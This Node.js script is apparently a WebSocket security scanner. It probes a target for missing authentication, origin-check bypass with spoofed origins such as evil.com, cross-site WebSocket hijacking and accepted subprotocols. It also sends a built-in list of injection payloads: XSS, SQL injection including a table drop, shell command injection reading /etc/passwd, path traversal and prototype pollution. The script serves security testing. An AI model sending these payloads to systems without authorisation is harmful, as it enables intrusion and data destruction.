#!/usr/bin/env node
/**
 * WebSocket security testing.
 *
 * Tests connection with/without authentication, origin header bypass,
 * message injection, cross-site WebSocket hijacking (CSWSH), and protocol enumeration.
 *
 * Usage:
 *   node test-websocket.js '{"target": "wss://example.com/ws", "origins": ["https://evil.com"], "messages": ["test"]}'
 */

"use strict";

let WebSocket;
try {
  WebSocket = require("ws");
} catch (e) {
  // ws not available, output error and exit
  console.log(
    JSON.stringify({
      error:
        "ws package not available. Install with: npm install -g ws",
      fallback: true,
    })
  );
  process.exit(1);
}

const TIMEOUT = 10000; // 10 seconds

function parseArgs() {
  if (process.argv.length < 3) {
    return {
      error: 'Usage: node test-websocket.js \'{"target": "wss://example.com/ws"}\'',
    };
  }
  try {
    return JSON.parse(process.argv[2]);
  } catch (e) {
    return { error: `Invalid JSON arguments: ${e.message}` };
  }
}

function testConnection(url, options = {}) {
  return new Promise((resolve) => {
    const startTime = Date.now();
    const result = {
      url,
      origin: options.origin || null,
      headers: options.headers || {},
      protocols: options.protocols || [],
      connected: false,
      messages_received: [],
      error: null,
      elapsed: 0,
      close_code: null,
      close_reason: null,
      server_headers: {},
    };

    const wsOptions = {
      handshakeTimeout: TIMEOUT,
      rejectUnauthorized: false,
    };

    if (options.origin) {
      wsOptions.origin = options.origin;
    }
    if (options.headers) {
      wsOptions.headers = options.headers;
    }

    let ws;
    try {
      ws = new WebSocket(
        url,
        options.protocols || [],
        wsOptions
      );
    } catch (e) {
      result.error = e.message;
      result.elapsed = Date.now() - startTime;
      resolve(result);
      return;
    }

    const timer = setTimeout(() => {
      result.elapsed = Date.now() - startTime;
      if (ws.readyState === WebSocket.OPEN) {
        ws.close();
      } else {
        ws.terminate();
      }
      resolve(result);
    }, TIMEOUT);

    ws.on("upgrade", (response) => {
      result.server_headers = {};
      for (const [key, value] of Object.entries(response.headers)) {
        result.server_headers[key] = value;
      }
    });

    ws.on("open", () => {
      result.connected = true;

      // Send test messages if provided
      if (options.messages && options.messages.length > 0) {
        for (const msg of options.messages) {
          try {
            ws.send(typeof msg === "string" ? msg : JSON.stringify(msg));
          } catch (e) {
            result.error = `Send error: ${e.message}`;
          }
        }

        // Wait briefly for responses, then close
        setTimeout(() => {
          result.elapsed = Date.now() - startTime;
          clearTimeout(timer);
          ws.close();
          resolve(result);
        }, 3000);
      } else {
        // No messages to send, close after brief wait
        setTimeout(() => {
          result.elapsed = Date.now() - startTime;
          clearTimeout(timer);
          ws.close();
          resolve(result);
        }, 1000);
      }
    });

    ws.on("message", (data) => {
      const msg = data.toString().substring(0, 500);
      result.messages_received.push(msg);
    });

    ws.on("close", (code, reason) => {
      result.close_code = code;
      result.close_reason = reason ? reason.toString() : null;
      result.elapsed = Date.now() - startTime;
      clearTimeout(timer);
      resolve(result);
    });

    ws.on("error", (err) => {
      result.error = err.message;
      result.elapsed = Date.now() - startTime;
      clearTimeout(timer);
      resolve(result);
    });
  });
}

async function testOriginBypass(target, origins) {
  const results = [];

  // Test without origin
  const noOrigin = await testConnection(target, {});
  results.push({
    test: "no_origin",
    origin: null,
    connected: noOrigin.connected,
    error: noOrigin.error,
    elapsed: noOrigin.elapsed,
  });

  // Test with each origin
  for (const origin of origins) {
    const result = await testConnection(target, { origin });
    results.push({
      test: "custom_origin",
      origin,
      connected: result.connected,
      error: result.error,
      elapsed: result.elapsed,
    });
  }

  // Check if any non-legitimate origin was accepted
  const accepted = results.filter((r) => r.connected && r.origin);

  return {
    test_type: "origin_bypass",
    results,
    origins_accepted: accepted.map((r) => r.origin),
    vulnerable: accepted.length > 0,
  };
}

async function testAuthentication(target, headers) {
  const results = [];

  // Test without auth
  const noAuth = await testConnection(target, {});
  results.push({
    test: "no_authentication",
    connected: noAuth.connected,
    error: noAuth.error,
  });

  // Test with auth headers
  if (headers && Object.keys(headers).length > 0) {
    const withAuth = await testConnection(target, { headers });
    results.push({
      test: "with_authentication",
      connected: withAuth.connected,
      error: withAuth.error,
    });
  }

  return {
    test_type: "authentication",
    results,
    accepts_unauthenticated: results[0].connected,
  };
}

async function testMessageInjection(target, messages, options = {}) {
  const injectionPayloads = [
    // XSS via WebSocket
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    // SQL injection
    "' OR 1=1 --",
    "1; DROP TABLE users; --",
    // Command injection
    "; ls -la",
    "| cat /etc/passwd",
    // Path traversal
    "../../../etc/passwd",
    // JSON injection
    '{"__proto__": {"admin": true}}',
    '{"constructor": {"prototype": {"admin": true}}}',
  ];

  const allMessages = [...(messages || []), ...injectionPayloads];

  const result = await testConnection(target, {
    messages: allMessages,
    origin: options.origin,
    headers: options.headers,
  });

  return {
    test_type: "message_injection",
    connected: result.connected,
    messages_sent: allMessages.length,
    messages_received: result.messages_received,
    error: result.error,
    interesting_responses: result.messages_received.filter(
      (msg) =>
        msg.includes("error") ||
        msg.includes("exception") ||
        msg.includes("root:") ||
        msg.includes("stack")
    ),
  };
}

async function testProtocolEnumeration(target) {
  const protocols = [
    "chat",
    "graphql-ws",
    "graphql-transport-ws",
    "mqtt",
    "stomp",
    "v10.stomp",
    "v11.stomp",
    "v12.stomp",
    "wamp.2.json",
    "soap",
    "xmpp",
    "binary",
  ];

  const results = [];

  for (const protocol of protocols) {
    const result = await testConnection(target, { protocols: [protocol] });
    results.push({
      protocol,
      accepted: result.connected,
      error: result.error,
    });
  }

  return {
    test_type: "protocol_enumeration",
    results,
    accepted_protocols: results
      .filter((r) => r.accepted)
      .map((r) => r.protocol),
  };
}

async function testCSWSH(target) {
  /**
   * Cross-Site WebSocket Hijacking:
   * If the WebSocket accepts connections from any origin and relies on cookies
   * for auth, an attacker page can establish a WS connection and read messages.
   */
  const evilOrigins = [
    "https://evil.com",
    "https://attacker.example.com",
    "null",
    "file://",
  ];

  const results = [];

  for (const origin of evilOrigins) {
    const result = await testConnection(target, { origin });
    results.push({
      origin,
      connected: result.connected,
      messages_received: result.messages_received.length,
      error: result.error,
    });
  }

  const vulnerable = results.some((r) => r.connected);

  return {
    test_type: "cswsh",
    description:
      "Cross-Site WebSocket Hijacking - tests if WS accepts cross-origin connections",
    results,
    potentially_vulnerable: vulnerable,
    note: vulnerable
      ? "WebSocket accepts cross-origin connections. If authentication is cookie-based, this is exploitable via CSWSH."
      : "WebSocket rejects cross-origin connections or requires explicit authentication.",
  };
}

async function main() {
  const args = parseArgs();
  if (args.error) {
    console.log(JSON.stringify({ error: args.error }));
    process.exit(1);
  }

  const target = args.target;
  if (!target) {
    console.log(
      JSON.stringify({ error: "Missing required parameter: target" })
    );
    process.exit(1);
  }

  const origins = args.origins || ["https://evil.com", "null"];
  const messages = args.messages || [];
  const headers = args.headers || {};
  const tests = args.tests || [
    "origin",
    "auth",
    "injection",
    "protocols",
    "cswsh",
  ];

  const results = {};

  if (tests.includes("origin")) {
    results.origin_bypass = await testOriginBypass(target, origins);
  }

  if (tests.includes("auth")) {
    results.authentication = await testAuthentication(target, headers);
  }

  if (tests.includes("injection")) {
    results.message_injection = await testMessageInjection(
      target,
      messages,
      { origin: origins[0], headers }
    );
  }

  if (tests.includes("protocols")) {
    results.protocol_enumeration = await testProtocolEnumeration(target);
  }

  if (tests.includes("cswsh")) {
    results.cswsh = await testCSWSH(target);
  }

  // Determine severity
  let severity = "info";
  const vulnerabilities = [];

  if (results.origin_bypass && results.origin_bypass.vulnerable) {
    vulnerabilities.push("origin_bypass");
    severity = "medium";
  }
  if (
    results.authentication &&
    results.authentication.accepts_unauthenticated
  ) {
    vulnerabilities.push("no_auth_required");
    severity = "medium";
  }
  if (results.cswsh && results.cswsh.potentially_vulnerable) {
    vulnerabilities.push("cswsh");
    severity = "high";
  }
  if (
    results.message_injection &&
    results.message_injection.interesting_responses &&
    results.message_injection.interesting_responses.length > 0
  ) {
    vulnerabilities.push("injection_indicators");
    severity = severity === "high" ? "high" : "medium";
  }

  const output = {
    target,
    tests_run: Object.keys(results).length,
    severity,
    vulnerabilities,
    results,
    summary: `Tested WebSocket at ${target}. Found ${vulnerabilities.length} potential issues: ${
      vulnerabilities.length > 0 ? vulnerabilities.join(", ") : "none"
    }.`,
  };

  console.log(JSON.stringify(output, null, 2));
}

main().catch((err) => {
  console.log(
    JSON.stringify({
      error: `Unhandled error: ${err.message}`,
      stack: err.stack,
    })
  );
  process.exit(1);
});
